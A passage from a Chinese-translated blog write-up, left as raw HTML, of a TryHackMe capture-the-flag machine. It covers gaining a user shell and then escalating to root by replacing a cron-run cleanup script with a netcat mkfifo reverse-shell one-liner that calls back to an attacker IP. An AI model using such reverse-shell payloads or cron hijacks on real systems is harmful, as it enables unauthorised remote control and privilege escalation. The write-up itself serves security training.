&gt;/tmp/f')</span></pre><p id="4826" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦我获得了一个反向外壳，我就可以得到用户<strong class="jp ir"> </strong>的标志😃！</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/cd1e159fe470e6fc6d83e01cfb2bce65.png" data-original-src="https://miro.medium.com/v2/resize:fit:832/format:webp/1*VP3_x-3tOqTgWiR7d0hn_A.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="9350" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">根权限提升</h1><p id="a0d3" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我开始寻找将我的权限提升到root的方法。在枚举机器时，我发现有一个cronjob正在使用工具<strong class="jp ir"> pspy32 </strong>运行清理脚本。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi om"><img src="../Images/9459f9cdfaca60f3bd059553136adf84.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*myg9sTHfwrgNf4M7bz_5qQ.png"/></div></figure><p id="d262" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我创建了一个新的<code class="fe of og oh ml b">cleanupscript.sh</code> bash脚本，它创建了一个反向shell:</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="18d5" class="mp lc iq ml b gy mq mr l ms mt">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.36.156 1234 &gt;/tmp/f</span></pre><p id="0bbc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用这个具有root权限的反向shell，我现在可以获得root标志了😄！</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi on"><img src="../Images/ce79b0b2de65a0e8241f6a95d1c57e2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/1*VTkZeS6SFG58qvWE-igLIA.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="5066" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">结束语</h1><p id="b432" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">找到最初的立足点是挑战中最困难的部分，我花了很长时间才找到。然而，一旦我理解了什么是利用，剩下的挑战就变得相对简单了。我也非常喜欢学习更多关于竞争条件以及如何利用它们的知识。谢谢你阅读到最后，希望你学到了新的东西！</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="01cb" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">参考</h1><div class="oo op gp gr oq or"><a href="https://tryhackme.com/" rel="noopener  ugc nofollow" target="_blank"><div class="os ab fo"><div class="ot ab ou cl cj ov"><h2 class="bd ir gy z fp ow fr fs ox fu fw ip bi translated">网络安全培训</h2><div class="oy l"><h3 class="bd b gy z fp ow fr fs ox fu fw dk translated">TryHackMe是一个免费的学习网络安全的在线平台，使用动手练习和实验室，通过您的…</h3></div><div class="oz l"><p class="bd b dl z fp ow fr fs ox fu fw dk translated">tryhackme.com</p></div></div><div class="pa l"><div class="pb l pc pd pe pa pf ks or"/></div></div></a></div><div class="oo op gp gr oq or"><a href="https://www.npmjs.com/package/racetrack" rel="noopener  ugc nofollow" target="_blank"><div class="os ab fo"><div class="ot ab ou cl cj ov"><h2 class="bd ir gy z fp ow fr fs ox fu fw ip bi translated">跑道</h2><div class="oy l"><h3 class="bd b gy z fp ow fr fs ox fu fw dk translated">Racetrack是一种确保所有异步调用都已完成的方法，如果有问题的话，还可以找出问题出在哪里…</h3></div><div class="oz l"><p class="bd b dl z fp ow fr fs ox fu fw dk translated">www.npmjs.com</p></div></div><div class="pa l"><div class="pg l pc pd pe pa pf ks or"/></div></div></a></div><div class="oo op gp gr oq or"><a href="https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44" rel="noopener follow" target="_blank"><div class="os ab fo"><div class="ot ab ou cl cj ov"><h2 class="bd ir gy z fp ow fr fs ox fu fw ip bi translated">Node.js RCE和一个简单的反向shell -CTF</h2><div class="oy l"><h3 class="bd b gy z fp ow fr fs ox fu fw dk translated">这个CTF风格的挑战的目标是获得对web服务器的完全访问权，分别窃取配置文件…</h3></div><div class="oz l"><p class="bd b dl z fp ow fr fs ox fu fw dk translated">medium.com</p></div></div><div class="pa l"><div class="ph l pc pd pe pa pf ks or"/></div></div></a></div></div></div>    
</body>
</html>